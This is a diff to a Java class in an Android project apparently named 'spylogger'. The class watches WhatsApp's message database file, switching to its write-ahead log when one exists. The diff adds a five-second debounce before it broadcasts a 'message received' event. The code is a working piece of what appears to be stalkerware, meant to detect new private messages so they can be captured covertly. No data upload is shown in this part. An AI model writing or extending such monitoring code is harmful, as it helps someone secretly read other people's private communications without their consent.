@@ -7,6 +7,8 @@ import android.util.Log;
 
 import com.gravatasufoca.spylogger.utils.Utils;
 
+import java.io.File;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -16,7 +18,10 @@ import java.util.Map;
 
 public abstract class DbObserver {
 
+    private final int TIMEOUT=5000;
+
     protected Context context;
+    private Long lastEvent=Long.MIN_VALUE;
 
     public DbObserver(Context context) {
         this.context = context;
@@ -36,13 +41,18 @@ public abstract class DbObserver {
         Log.i("SPYLOGGER", "INICIANDO OBSERVER WHATSAPP");
         FileObserver fileObserver;
         if(!observers.containsKey(clazz)) {
-            fileObserver = new FileObserver(path) {
+            String pt=path;
+            if(new File(pt+"-wal").exists()){
+                pt=path+"-wal";
+            }
+            fileObserver = new FileObserver(pt,FileObserver.MODIFY) {
                 @Override
                 public void onEvent(int event, String file) {
+//                    Log.i("spyloggerfile", observers.get(clazz).toString()+ " - "+event);
 
                     switch (event) {
                         case FileObserver.MODIFY:
-                            Log.d("DEBUG", "MODIFY:" + path + file);
+                            Log.d("DEBUG", "MODIFY:" + path );
                             sendEvent(clazz);
                             break;
                         default:
@@ -58,8 +68,14 @@ public abstract class DbObserver {
     }
 
     private void sendEvent(Class clazz) {
-        Intent intent = new Intent(Utils.MENSAGEM_RECEBIDA);
-        intent.putExtra("classe", clazz.getName());
-        context.sendBroadcast(intent);
+
+        Log.d("spyloggertime",(lastEvent+TIMEOUT)+"="+new Date().getTime());
+        if(lastEvent==Long.MIN_VALUE || lastEvent+TIMEOUT<=new Date().getTime()) {
+            Log.d("spyloggertime","ENVIANDO...");
+            Intent intent = new Intent(Utils.MENSAGEM_RECEBIDA);
+            intent.putExtra("classe", clazz.getName());
+            context.sendBroadcast(intent);
+            lastEvent=new Date().getTime();
+        }
     }
 }
